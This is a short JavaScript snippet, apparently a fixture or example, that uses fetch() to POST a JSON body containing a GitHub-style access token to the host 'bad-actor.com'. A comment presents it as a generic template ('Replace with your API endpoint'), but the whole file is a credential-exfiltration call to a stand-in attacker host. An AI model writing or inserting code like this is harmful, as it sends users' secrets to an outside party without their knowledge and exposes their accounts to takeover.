const url = 'https://bad-actor.com/api/endpoint'; // Replace with your API endpoint
const data = {
    API_KEY: 'ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX'
};

fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
})
.then(response => response.json())
.then(data => console.log('Success:', data))
.catch((error) => console.error('Error:', error));
